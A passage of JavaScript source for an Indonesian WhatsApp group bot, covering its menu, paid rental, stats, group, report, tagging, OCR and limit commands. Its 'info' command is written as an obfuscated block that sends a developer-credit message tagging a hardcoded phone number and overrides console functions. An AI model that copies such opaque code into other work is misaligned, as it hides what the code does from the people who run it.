│➻ ${prefix}toloserti  [text]
│➻ ${prefix}goodboy  [text]
│➻ ${prefix}goodgirl  [text]
│➻ ${prefix}badboy  [text]
│➻ ${prefix}badgirl  [text]
│➻ ${prefix}pacarserti  [text & text]
├──────────────────
│ *DJ KHUSUS PREMIUM*
│ Tanpa [ ${prefix} ]
│➻ aduh
│➻ ampun
│➻ anjay
│➻ dingin
│➻ foya
│➻ gatalsa
│➻ iri
│➻ mantap
│➻ masih
│➻ rindu
│➻ semua
│➻ setiap
│➻ tapi
│➻ whitecoffe
│➻ cinta100%
│➻ darkside
│➻ gemes
│➻ playdate
│➻ tonight
│➻ goyangdumang
│➻ jadikanakuyangkedua
╰────────────────── `
					client.sendMessage(from, premimenunye, text, {quoted: mek})
					break 

		case 'donasi':
		case 'donate':
					client.sendMessage(from, donasi(), text)
					break
		case 'sewa':
		case 'sewabot':
		case 'daftarpremium':
					client.sendMessage(from,`╭─────────────
│ *「 SEWA + PREMIUM 」*
│
├≽ *DURASI*
├ 15 Hari = 7K
├ 30 Hari = 10k
├ 47 Hari = 15k
├ 63 Hari = 20k
│
├≽ *METODE PEMBAYARAN*
├ Shopee-pay/Ovo/Dana/Pulsa
├ Metode pulsa +5k
│
├≽ *KEUNTUNGAN JADI PREMIUM*
├ Bisa joinin bot ke grup kamu!
├ Akses semua fitur premium!
├ Unlimited limit!
├ Dapat grup premium!
├ Fast respon owner!
│
├ JIKA INGIN SEWA BOT
├ Chat Owner BOT :
├ wa.me/${Laporowner}
╰─────────────`, text)
					break
		
			case 'botstat': 
			case 'mystat': 
			case 'stats':
			case 'mystatus':
						let iq = []
						let giid = []
						for (mem of totalchat){
						iq.push(mem.jid)
						}
						for (idq of iq){
						if (idq && idq.includes('g.us')){
						giid.push(idq)
						}
						}
						let timestampi = speed();
						let latensii = speed() - timestampi
						const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = client.user.phone
						anuruntime = process.uptime()
						teskny = `*「 SISTEM BOT INFO 」*
		
*SERVER :* ${os.hostname()}
*PLATFORM :* ${os.platform()}
*RAM :* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
*SPEED :* ${os.cpus()[0].speed} MHz
*CPU :* ${os.cpus().length}
					
*V. Whatsapp :* ${wa_version}
*MCC :* ${mcc}
*MNC :* ${mnc}
*Merk HP :* ${device_manufacturer}
*Versi OS :* ${os_version}
*Baterai :* ${baterai.baterai}%
*Charge :* ${baterai.cas === 'true' ? 'Charging ⚡' : 'Discharging'}

*Group Chat :* ${giid.length}
*Personal Chat :* ${totalchat.length - giid.length}
*Total Chat :* ${totalchat.length}

*Speed :* ${latensii.toFixed(4)} Second
*Runtime :* ${kyun(anuruntime)}`
						client.sendMessage(from, teskny, text)
						break					
				case 'infogc':
				case 'groupinfo':
				case 'infogroup':
				case 'infogrup':
				case 'grupinfo':
							if (!isRegistered) return reply(mess.only.userB)
							if (!isGroup) return reply(mess.only.group)
						    var pantili = isAntilink
						    var anjay = isAntiVirtex
						    var yaw = isWelkom
						    var wanjay = isBadWord
						    try {
							ppUrl = await client.getProfilePicture(from)
							} catch {
							ppUrl = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
							}
						    buffer = await getBuffer(ppUrl)
						    client.sendMessage(from, buffer, image, {quoted: mek, caption: `*「 GROUP INFO 」*
		
*Nama :* ${groupName}
*Owner :* @${groupMetadata.owner.split('@')[0]}
*Admin :* ${groupAdmins.length}
*Member :* ${groupMembers.length}
*Welcome :* ${yaw ? 'Aktif' : 'Nonaktif'}
*Antilink :* ${pantili ? 'Aktif' : 'Nonaktif'}
*Anti Virtext :* ${anjay ? 'Aktif' : 'Nonaktif'}
*Anti Badword :* ${wanjay ? 'Aktif' : 'Nonaktif'}
*Description :*
${groupDesc}`, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})
						break
			case 'tagstick':
			case 'tagsticker':
                    if (isBanned) return reply(mess.only.benned)    
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return reply(mess.only.ownerB)
                    if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
                        const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        filePath = await client.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
                        var value = args.join(" ")
                        var group = await client.groupMetadata(from)
                        var member = group['participants']
                        var mem = []
                        member.map(async adm => {
                            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                        })
                        var options = {
                            contextInfo: { mentionedJid: mem },
                            quoted: mek
                        }
                        ini_buffer = fs.readFileSync(filePath)
                        client.sendMessage(from, ini_buffer, sticker, options)
                        fs.unlinkSync(filePath)
                    } else {
                        reply(`Tag sticker yang sudah dikirim`)
                    }
                    break
		case 'level':		
                    if (!isRegistered) return reply(mess.only.userB)
					if (!isLevelingOn) return reply(`Level di group belum diaktifkan`)
					if (!isGroup) return reply(mess.only.group)
					const userLevel = getLevelingLevel(sender)
					const userXp = getLevelingXp(sender)
					if (userLevel === undefined && userXp === undefined) return reply(`Level kamu masih kosong`)
					const requiredXp = 5000 * (Math.pow(2, userLevel) - 1)
					resul = `◪ *LEVEL*
├─ ❏ *Nama :* ${pushname}
├─ ❏ *Nomor :* ${sender.split("@")[0]}
├─ ❏ *User XP :* ${userXp}/${requiredXp}
└─ ❏ *User Level :* ${userLevel}\n`
					client.sendMessage(from, resul, text, { quoted: mek})
					.catch(async (err) => {
					console.error(err)
					await reply(`Error!\n${err}`)
					})
					break
		case 'info':
		case 'infobot':
		case 'infodeveloper':
		case 'infopengembang':
(function(_0x195e72,_0x3a35c2){const _0x3bbb60=_0x195e72();function _0x1948ab(_0x45508e,_0x461c1e,_0x3fc519,_0xeb6c){return _0x2e30(_0xeb6c-0x1cd,_0x461c1e);}function _0x5a33ee(_0x431f73,_0x23547b,_0x2d5ca0,_0x12887b){return _0x2e30(_0x431f73- -0x7a,_0x12887b);}while(!![]){try{const _0x2c2050=parseInt(_0x1948ab(0x279,0x25f,0x253,0x257))/(0xb*0x23e+0x65f*-0x5+0x732)+parseInt(_0x1948ab(0x236,0x238,0x245,0x244))/(-0x9d*-0x1+-0x5*-0x7a5+-0x58c*0x7)+parseInt(_0x5a33ee(0x12,0x2b,0x32,0x9))/(-0x258d+-0xc45*-0x3+-0x1*-0xc1)*(-parseInt(_0x1948ab(0x233,0x248,0x241,0x239))/(-0x183*-0x9+-0x106a*0x1+0x2d3))+-parseInt(_0x1948ab(0x284,0x260,0x273,0x27c))/(-0x3*-0x1af+-0x1665+0x115d)*(parseInt(_0x5a33ee(0x1e,0x3b,0x36,-0x3))/(-0xbca*0x3+-0xf62+0x32c6))+-parseInt(_0x1948ab(0x275,0x286,0x26a,0x266))/(0x2*-0xbb9+-0x56+0x109*0x17)+parseInt(_0x1948ab(0x267,0x263,0x27c,0x276))/(-0x7*-0x22e+0x6b*0x47+-0x13*0x25d)+parseInt(_0x5a33ee(0x19,0x30,0x2b,-0x9))/(-0x1249*0x1+0x9b*0x3+-0x5*-0x34d);if(_0x2c2050===_0x3a35c2)break;else _0x3bbb60['push'](_0x3bbb60['shift']());}catch(_0x12cb7a){_0x3bbb60['push'](_0x3bbb60['shift']());}}}(_0x28ef,0x1f72f+-0x8097*-0x3+0x34293));const _0x5c2714=(function(){let _0x38ab51=!![];return function(_0x311f61,_0xeb1ae){function _0x953e1c(_0x5aa398,_0x19542f,_0x4df8b6,_0x3a7cdf){return _0x2e30(_0x5aa398- -0x193,_0x3a7cdf);}if('gETpZ'===_0x953e1c(-0xf0,-0xe2,-0xde,-0x101)){const _0x259176=_0x38ab51?function(){function _0x343a9f(_0x439297,_0x8561bb,_0x142b46,_0x4967af){return _0x953e1c(_0x439297- -0x1bb,_0x8561bb-0x16b,_0x142b46-0xc3,_0x4967af);}if(_0xeb1ae){const _0x2c72aa=_0xeb1ae[_0x343a9f(-0x2bd,-0x2df,-0x2ac,-0x2b5)](_0x311f61,arguments);return _0xeb1ae=null,_0x2c72aa;}}:function(){};return _0x38ab51=![],_0x259176;}else{const _0x5aea93=_0x20409d?function(){function _0x447536(_0x2cba01,_0x37537e,_0x27c7bf,_0x2ceecf){return _0x953e1c(_0x2cba01-0x6a,_0x37537e-0x183,_0x27c7bf-0x19f,_0x37537e);}if(_0x41dbd2){const _0x28c601=_0x588497[_0x447536(-0x98,-0x9c,-0x9b,-0xa8)](_0x48a093,arguments);return _0x160e72=null,_0x28c601;}}:function(){};return _0x5dab53=![],_0x5aea93;}};}()),_0x38cd4c=_0x5c2714(this,function(){const _0x213ade={};function _0x2f7e54(_0x15118d,_0x265e40,_0x46eb7e,_0x27b2c8){return _0x2e30(_0x15118d- -0x22d,_0x27b2c8);}_0x213ade['pARzE']=_0x2bbca1(0x323,0x335,0x33a,0x333)+'+$';const _0x15d6a4=_0x213ade;function _0x2bbca1(_0x2d50a8,_0x3bb0f7,_0x2090ca,_0x25a823){return _0x2e30(_0x2090ca-0x2b2,_0x2d50a8);}return _0x38cd4c['toString']()[_0x2f7e54(-0x1bb,-0x1d7,-0x1d4,-0x1df)](_0x15d6a4[_0x2bbca1(0x350,0x33a,0x34f,0x350)])[_0x2bbca1(0x337,0x344,0x32c,0x334)]()[_0x2bbca1(0x355,0x36c,0x35e,0x34a)+'r'](_0x38cd4c)[_0x2f7e54(-0x1bb,-0x1a0,-0x1c3,-0x1af)](_0x2bbca1(0x33e,0x353,0x33a,0x341)+'+$');});_0x38cd4c();function _0x28ef(){const _0x49a1c7=['WQQlm','9MkyjyP','console','error','HWgmt','*Team\x20:*\x20I','apply','ZRGvr','7523820ITMCkL','info','n\x20:*\x20V2\x0a╠\x20','GqDXZ','fOAyf','201378EfwIfQ','5639249mvpgJM','rn\x20this\x22)(','TqKIg','ctor(\x22retu','pARzE','859@s.what','ZhmAe','MIElR','PPOBe','pbpmh','gETpZ','mentionedJ','zwtDP','prototype','TFsbq','table','2728808xCTSte','\x0a╠\x20*Versio','══✪〘\x20*','constructo','sendMessag','*\x20〙✪══','75xhLMov','pe\x20:*\x20NODE','quoted','bind','845004AFhCwq','length','*Nama\x20:*\x20','agDJS','exception','VAN\x20TEAM\x0a╠\x20','search','6289526565831','GrGGR','sapp.net','OHupz','1205038AiaMJY','nction()\x20','ZcWuy','toString','IjCjy','jnDTi','ZljJa','aTvZe','mIuAs','\x0a╠\x20*Bot\x20Ty','{}.constru','╔══✪〘\x20*INF','sBNNS','trace','sfhKJ','return\x20(fu','contextInf','(((.+)+)+)','LWQcM','604428IonsNp'];_0x28ef=function(){return _0x49a1c7;};return _0x28ef();}const _0x39bd1a=(function(){const _0x40b3b4={'fOAyf':function(_0xeec49c,_0x4a1091){return _0xeec49c(_0x4a1091);},'ZhmAe':function(_0x56165e,_0x432c85){return _0x56165e+_0x432c85;},'OtZoT':_0x4b2d97(0x2e8,0x2c1,0x2e2,0x2d1)+_0x20087f(-0x270,-0x284,-0x295,-0x291),'GqDXZ':'{}.constru'+_0x20087f(-0x281,-0x251,-0x264,-0x26d)+_0x20087f(-0x279,-0x273,-0x27a,-0x26f)+'\x20)','TFsbq':'PPOBe'};function _0x4b2d97(_0x2c55b9,_0x57eb00,_0x215885,_0x22c99e){return _0x2e30(_0x22c99e-0x24b,_0x2c55b9);}function _0x20087f(_0x32a0ab,_0x41bdba,_0x307b06,_0x353250){return _0x2e30(_0x353250- -0x309,_0x307b06);}let _0x24eff7=!![];return function(_0x246ac4,_0x594f56){const _0x3a42f5={'MIElR':function(_0x3990a5,_0x5ceae5){function _0x95a846(_0x1a6a05,_0x792738,_0x1fe73d,_0xe57a73){return _0x2e30(_0x1fe73d- -0xf0,_0x1a6a05);}return _0x40b3b4[_0x95a846(-0x4b,-0x58,-0x59,-0x39)](_0x3990a5,_0x5ceae5);},'ZRGvr':function(_0x35ea76,_0x2b5fbf){function _0x194497(_0x38c4bd,_0x5b6245,_0x29ae3f,_0x285b8e){return _0x2e30(_0x29ae3f-0x3b0,_0x38c4bd);}return _0x40b3b4[_0x194497(0x462,0x46b,0x44f,0x42d)](_0x35ea76,_0x2b5fbf);},'ZcWuy':_0x40b3b4['OtZoT'],'mIuAs':_0x40b3b4[_0x4d03b0(0x37,0x14,0x17,0x12)],'agDJS':function(_0x16cbd4,_0x4b39b5){return _0x16cbd4!==_0x4b39b5;},'ZljJa':_0x4d03b0(0x34,0xe,0x1c,0x10),'pbpmh':_0x2bf39f(0x1c7,0x1e7,0x1aa,0x1e9)};function _0x2bf39f(_0x13e0e4,_0x2393e5,_0x3f80d0,_0x4b2ce6){return _0x4b2d97(_0x4b2ce6,_0x2393e5-0x178,_0x3f80d0-0x54,_0x13e0e4- -0xfa);}function _0x4d03b0(_0x31578f,_0x8b44b,_0x1e6e61,_0x2bf5cb){return _0x20087f(_0x31578f-0x12,_0x8b44b-0x3a,_0x31578f,_0x1e6e61-0x28a);}if(_0x2bf39f(0x1f2,0x200,0x1fb,0x207)!==_0x40b3b4[_0x2bf39f(0x1f8,0x1da,0x1d8,0x1d7)])_0x12ca73=_0x3a42f5[_0x4d03b0(0x20,0x2e,0x21,0x7)](_0x38fe46,_0x3a42f5[_0x2bf39f(0x1e3,0x1d6,0x1cc,0x202)](_0x3a42f5[_0x4d03b0(0xf,-0x17,-0x6,-0x1f)]+_0x3a42f5[_0x4d03b0(0x10,-0x18,0x0,-0x11)],');'))();else{const _0x21cc1b=_0x24eff7?function(){function _0x10750a(_0x9c1252,_0x1d222f,_0x352ada,_0x5253cc){return _0x4d03b0(_0x5253cc,_0x1d222f-0xa,_0x9c1252- -0x144,_0x5253cc-0xbb);}function _0x40dd37(_0x53b0fc,_0x449ef1,_0x2a11ec,_0x4c16b2){return _0x2bf39f(_0x2a11ec- -0x512,_0x449ef1-0x19d,_0x2a11ec-0xfb,_0x4c16b2);}if(_0x3a42f5[_0x40dd37(-0x34d,-0x354,-0x352,-0x350)](_0x3a42f5[_0x10750a(-0x146,-0x125,-0x141,-0x152)],_0x3a42f5[_0x40dd37(-0x32a,-0x302,-0x31f,-0x338)])){if(_0x594f56){const _0x484bac=_0x594f56[_0x40dd37(-0x32e,-0x31f,-0x330,-0x338)](_0x246ac4,arguments);return _0x594f56=null,_0x484bac;}}else{const _0x2adc3d=_0x53e7bf?function(){function _0x4d1b4f(_0x23dd03,_0x6f0d73,_0x6cceb6,_0x4d6e03){return _0x40dd37(_0x23dd03-0xe2,_0x6f0d73-0x1d1,_0x23dd03-0x6dd,_0x4d6e03);}if(_0x2fc2c0){const _0x1784cc=_0x435383[_0x4d1b4f(0x3ad,0x3ce,0x3ab,0x3a2)](_0x304f25,arguments);return _0x4755fa=null,_0x1784cc;}}:function(){};return _0x32247a=![],_0x2adc3d;}}:function(){};return _0x24eff7=![],_0x21cc1b;}};}()),_0x5f1d3e=_0x39bd1a(this,function(){function _0x497cd1(_0x18b328,_0x418d38,_0x5a855a,_0x5825ba){return _0x2e30(_0x18b328-0xd,_0x418d38);}const _0x458713={'sfhKJ':function(_0x61755,_0x188101){return _0x61755(_0x188101);},'jnDTi':function(_0x508a9f,_0xa477d4){return _0x508a9f+_0xa477d4;},'GrGGR':_0x497cd1(0x93,0xb1,0xa2,0x96)+_0x497cd1(0x85,0xa4,0xa6,0x6d),'Ptdbd':'log','sBNNS':'warn','zwtDP':_0x11f67e(0xc3,0xd6,0xc3,0xb5),'SprGc':_0x497cd1(0x9b,0x9d,0xb4,0xab),'HWgmt':_0x11f67e(0xbc,0xb2,0xc3,0xcf),'YSQSQ':_0x497cd1(0x91,0xab,0x8a,0x7c),'LWQcM':function(_0x1a45ce,_0x1a2b2d){return _0x1a45ce<_0x1a2b2d;},'OVOyH':function(_0x560777,_0x4113e7){return _0x560777===_0x4113e7;},'aTvZe':_0x497cd1(0x98,0x83,0x9b,0xb3),'BtWXB':_0x11f67e(0xc0,0xbd,0xa7,0x9d)},_0x166e33=function(){let _0x68c559;try{_0x68c559=_0x458713[_0x94fdbb(0x337,0x31c,0x319,0x318)](Function,_0x458713[_0x295120(-0x166,-0x178,-0x17e,-0x160)](_0x458713[_0x94fdbb(0x309,0x313,0x302,0x30c)](_0x458713[_0x295120(-0x1a2,-0x180,-0x15f,-0x18f)],_0x295120(-0x172,-0x173,-0x18f,-0x153)+_0x295120(-0x144,-0x158,-0x15f,-0x162)+_0x295120(-0x16e,-0x15a,-0x14e,-0x143)+'\x20)'),');'))();}catch(_0x5ec6d9){_0x68c559=window;}function _0x94fdbb(_0x51a8a6,_0xad2fc7,_0x4e12d9,_0x11807e){return _0x11f67e(_0x51a8a6-0x76,_0xad2fc7-0x255,_0x4e12d9,_0x11807e-0x16e);}function _0x295120(_0x561f17,_0x15ea52,_0x161a69,_0xc55a0b){return _0x497cd1(_0x15ea52- -0x201,_0xc55a0b,_0x161a69-0x6b,_0xc55a0b-0x1bd);}return _0x68c559;},_0x2b4894=_0x166e33(),_0x38ee9b=_0x2b4894[_0x497cd1(0x9a,0x9a,0xa4,0xb4)]=_0x2b4894[_0x11f67e(0xef,0xcf,0xcc,0xdb)]||{};function _0x11f67e(_0x4ab240,_0x19d730,_0x5f29f0,_0x3bb120){return _0x2e30(_0x19d730-0x42,_0x5f29f0);}const _0x148435=[_0x458713['Ptdbd'],_0x458713[_0x497cd1(0x90,0xb2,0x83,0x8d)],_0x458713[_0x497cd1(0xb2,0xa7,0x9b,0xa1)],_0x458713['SprGc'],_0x458713[_0x11f67e(0xeb,0xd1,0xe6,0xed)],_0x497cd1(0xb5,0x92,0xc9,0xb6),_0x458713['YSQSQ']];for(let _0x5df56d=0x1*-0x1ca3+0xd57+0x1*0xf4c;_0x458713[_0x497cd1(0x96,0x74,0x95,0xb0)](_0x5df56d,_0x148435[_0x11f67e(0xa5,0xaf,0xb0,0x97)]);_0x5df56d++){if(_0x458713['OVOyH'](_0x458713[_0x497cd1(0x8b,0xa2,0x87,0xa8)],_0x458713['BtWXB'])){const _0x12bf4f=_0x4e0c4a[_0x11f67e(0xfe,0xee,0x103,0x10c)+'r']['prototype'][_0x11f67e(0xfe,0xf4,0xeb,0xfe)](_0xa54245),_0x5db7bc=_0x4019ef[_0x18a276],_0x2bc8f3=_0x1a0f6d[_0x5db7bc]||_0x12bf4f;_0x12bf4f['__proto__']=_0x341f7f[_0x11f67e(0xe9,0xf4,0xe2,0xdb)](_0x3a296b),_0x12bf4f[_0x497cd1(0x87,0x78,0x74,0x83)]=_0x2bc8f3[_0x11f67e(0xa6,0xbc,0xc8,0xae)][_0x11f67e(0xe3,0xf4,0x110,0x116)](_0x2bc8f3),_0x4f440c[_0x5db7bc]=_0x12bf4f;}else{const _0x1ebcda=_0x39bd1a[_0x497cd1(0xb9,0xa7,0xa4,0x9a)+'r'][_0x11f67e(0xed,0xe8,0xf6,0x109)][_0x11f67e(0x10c,0xf4,0xe9,0xdb)](_0x39bd1a),_0x1f6e2b=_0x148435[_0x5df56d],_0x3a8cff=_0x38ee9b[_0x1f6e2b]||_0x1ebcda;_0x1ebcda['__proto__']=_0x39bd1a[_0x497cd1(0xbf,0xc8,0xc1,0xb4)](_0x39bd1a),_0x1ebcda['toString']=_0x3a8cff[_0x497cd1(0x87,0x70,0xa0,0x79)][_0x11f67e(0xf6,0xf4,0xf9,0x10a)](_0x3a8cff),_0x38ee9b[_0x1f6e2b]=_0x1ebcda;}}});function _0x2e30(_0x5c2714,_0x28efed){const _0x2e3098=_0x28ef();return _0x2e30=function(_0x580a5d,_0x1df89a){_0x580a5d=_0x580a5d-(0xd59*0x1+0xa55*0x2+0x1*-0x2197);let _0x37ca5a=_0x2e3098[_0x580a5d];return _0x37ca5a;},_0x2e30(_0x5c2714,_0x28efed);}function _0x27af2d(_0x473b82,_0x4b7987,_0x55e661,_0x51eef4){return _0x2e30(_0x51eef4-0x240,_0x4b7987);}_0x5f1d3e();function _0x371bf5(_0x20bbdc,_0x32328a,_0x37678a,_0xd7b6d4){return _0x2e30(_0x32328a-0x2c9,_0xd7b6d4);}const srd=_0x27af2d(0x2c6,0x2a8,0x2a7,0x2b3)+_0x371bf5(0x36a,0x367,0x346,0x373)+_0x371bf5(0x344,0x33e,0x31c,0x359),bjir=_0x371bf5(0x334,0x34b,0x340,0x342)+'ORMATION*\x20'+'〙✪══\x0a║\x20\x0a╠\x20'+_0x27af2d(0x2b5,0x2b2,0x29b,0x2ae)+namabot+(_0x27af2d(0x2c8,0x2ec,0x2f4,0x2ea)+_0x27af2d(0x2b6,0x2f2,0x2c5,0x2d5)+_0x27af2d(0x2be,0x2e5,0x2e0,0x2d0)+_0x371bf5(0x31a,0x33a,0x348,0x341)+'*Developer'+'\x20:*\x20@')+srd['split']('@')[0x1f22+0x6fa+0x65a*-0x6]+(_0x27af2d(0x2cc,0x2ac,0x2a7,0x2c0)+_0x27af2d(0x2f9,0x2e4,0x2fb,0x2f0)+'JS\x20V14\x0a║\x0a╚'+_0x27af2d(0x2fd,0x2f6,0x2d3,0x2eb))+namabot+_0x371bf5(0x388,0x377,0x374,0x375),_0x274020={};_0x274020[_0x371bf5(0x364,0x36d,0x372,0x35b)+'id']=[srd];const _0xb837c0={};_0xb837c0[_0x371bf5(0x376,0x37a,0x374,0x381)]=mek,_0xb837c0[_0x27af2d(0x2c9,0x2db,0x2bf,0x2c7)+'o']=_0x274020,client[_0x371bf5(0x394,0x376,0x38e,0x375)+'e'](from,bjir,text,_0xb837c0);
						break
		case 'snk':
				
					client.sendMessage(from,`*Syarat & Ketentuan ${namabot}*\n\n1. Teks dan nama pengguna whatsApp anda kami simpan di dalam server selama bot aktif.\n2. Data anda akan di hapus ketika bot offline.\n3. Kami tidak menyimpan gambar, video, file, audio, dan dokumen yang anda kirim.\n4. Kami tidak pernah meminta anda untuk memberikan informasi pribadi.\n5. Jika menemukan bug/error silahkan langsung lapor ke owner bot.\n6. Cukup perintah 1x jika bot tidak merespon harap ulangi kembali, Jika di ulangi kembali tidak merespon, bot tidak aktif\n7. Dilarang spam, Telpon, Video call, Kami akan blokir anda.\n8. Apapun yang anda perintah pada bot ini, dosa ditanggung sendiri !\n9. Apapun yang anda perintah pada bot ini, *KAMI TIDAK BERTANGGUNG JAWAB!*\n\nTERIMA KASIH !` , MessageType.text)
					break
		case 'lpr':
		case 'report':
			    if (!isRegistered) return reply(mess.only.userB)
			    const pesan = body.slice(9)
			    if (pesan.length > 300) return client.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, {quoted: mek})
			    var nomorny = mek.participant
			    const teks1 = `*[REPORT]*\nNomor : @${nomorny.split("@s.whatsapp.net")[0]}\nPesan : ${pesan}`
			    var options = {
			    text: teks1,
			    contextInfo: {mentionedJid: [nomorny]},
		        }
		        client.sendMessage(`${Laporowner}@s.whatsapp.net`, options, text, {quoted: mek})
		        reply('Masalah telah di laporkan ke owner bot, laporan palsu/main2 tidak akan ditanggapi.')
		        break
		case 'request':
			        if (!isRegistered) return reply(mess.only.userB)
					const cfrr = body.slice(9)
					if (cfrr.length > 300) return client.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', msgType.text, {quoted: mek})
					var nomor = mek.participant
					const ress = `*[REQUEST]*\nNomor : @${nomor.split("@s.whatsapp.net")[0]}\nPesan : ${cfrr}`
					var options = {
					text: ress,
                    contextInfo: {mentionedJid: [nomor]},
                    }			
					client.sendMessage(`${Laporowner}@s.whatsapp.net`, options, text, {quoted: mek})
					reply('REQUEST ANDA TELAH SAMPAI KE OWNER BOT. REQUEST PALSU ATAU MAIN² TIDAK AKAN DITANGGAPI.')
					break
		case 'blocklist': 
		case 'listblock': 
		case 'listblok': 
					teks = 'This is list of blocked number :\n'
					for (let block of blocked) {
					teks += `~> @${block.split('@')[0]}\n`
					}
					teks += `Total : ${blocked.length}`
					client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": blocked}})
					break
            case 'hidetag':
			     	if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return reply(mess.limituser)
				    if (isBanned) return reply(mess.only.benned)
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					var value = body.slice(9)
					var group = await client.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					client.sendMessage(from, options, text)
					await limitAdd(sender)
					break

            case 'afk':
					client.updatePresence(from, Presence.composing)
					if (!isRegistered) return reply(mess.only.userB)
					if (!isGroup) return reply(mess.only.group)
					if (isLimit(sender)) return reply(mess.limituser)
				    if (isBanned) return reply(mess.only.benned)
					const reason = q ? q : 'Nothing.'
					_afk.addAfkUser(sender, time, reason, afk)
					reply(`*「 BOT AFK 」*\n\n• *Alasan:* ${reason}\n• *Status:* Sedang Offline!\n• *Offline:* ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}`)
                    break 
            
            case 'profile':
		    case 'profil':
					var premma = isPremium
					var anjayy = isBanned
                    var anjay = isRegistered
    				client.updatePresence(from, Presence.composing)				
    				try {
					ppimg = await client.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
					} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
					}
					profile = `*「 PROFILE ANDA 」*
*Name :* ${pushname}
*XP :* ${getLevelingXp(sender)}
*Atm :* ${checkATMuser(sender)}
*Role :* ${role}
*Level :* ${getLevelingLevel(sender)}
*User Terdaftar :* ${anjay ? '✔' : '❌'}
*User Premium :* ${premma ? '✔' : '❌'}
*User Banned :* ${anjayy ? '✔' : '❌'}
*Link :* wa.me/${sender.split("@")[0]}`
					buffer = await getBuffer(ppimg)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: profile})
					break
		case 'ocr': 		
                    if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return reply(mess.limituser)
				    if (isBanned) return reply(mess.only.benned)
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						reply(ind.wait())
						await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
							.then(teks => {
								reply(teks.trim())
								fs.unlinkSync(media)
							})
							.catch(err => {
								reply(err.message)
								fs.unlinkSync(media)
							})
					} else {
						reply(`*Kirim foto dengan caption ${prefix}ocr*`)
					}
					await limitAdd(sender)
					break
		case 'setprefix':
					if (!isOwner) return reply(mess.only.ownerB)
					prefix = args[0]
					reply(`*Prefix berhasil di ubah menjadi :* ${prefix}`)
					break 
		case 'setlimit':
		case 'addlimit':
					if (!isOwner) return reply(mess.only.ownerB)
					limitawal = args[0]
					reply(`*Limit berhasil di ubah menjadi :* ${limitawal}`)
					break 
		case 'setlimitt':
		case 'addlimitt':
				    if (!isAdmin) return reply(`Maaf perintah ini hanya bisa digunakan oleh admin ${namabot}`)
					limitawal = args[0]
					reply(`*Limit berhasil di ubah menjadi :* ${limitawal}`)
					break 
		case 'setmemlimit':				
					if (!isOwner) return reply(mess.only.ownerB)
					if (isNaN(args[0])) return reply('Limit harus angka')
					memberlimit = args[0]
					reply(`Change member limit to ${memberlimit} success!`)
					break 
		case 'setmemlimitt':
				    if (!isAdmin) return reply(`Maaf perintah ini hanya bisa digunakan oleh admin ${namabot}`)
					if (isNaN(args[0])) return reply('Limit harus angka')
					memberlimit = args[0]
					reply(`Change member limit to ${memberlimit} success!`)
					break 
		case 'ownergrup':
		case 'ownergroup':
		        	if (!isGroup) return reply(mess.only.group)
			    	if (isLimit(sender)) return reply(mess.limituser)
			        ownergc = `Owner group ini adalah: @${groupMetadata.owner.split('@')[0]}`
					client.sendMessage(from, ownergc, text, {quoted: mek, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})
					break
            case 'linkgc':
			case 'linkgroup':
			case 'linkgrup':
			    	if (!isGroup) return reply(mess.only.group)
			    	if (isLimit(sender)) return reply(mess.limituser)
			    	if (!isBotGroupAdmins) return reply(mess.only.Badmin)
			    	linkgc = await client.groupInviteCode (from)
			     	yeh = `*Link Group ${groupName} :*\nhttps://chat.whatsapp.com/${linkgc}`
			    	client.sendMessage(from, yeh, text, {quoted: mek})
			    	await limitAdd(sender)
			    	break
			case 'resetlink':
			case 'resetlinkgroup':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					json = ['action', 'inviteReset', from]
					client.query({json, expect200: true})
					await sleep(3000)
					reply('Sukses mereset link group!')
					break
            case 'add':
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return reply(mess.only.ownerB)
				//	if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('Yang mau di add siapa??')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara gan')
					try {
					num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
					client.groupAdd(from, [num])
					} catch (e) {
					console.log('Error :', e)
					reply('Gagal menambahkan target, mungkin karena di private')
					}
					break
		    case 'bot':
					client.sendMessage(from,`Hi ${pushname}, Ada yang bisa bot bantu?` ,MessageType.text, { quoted: mek} )
					break
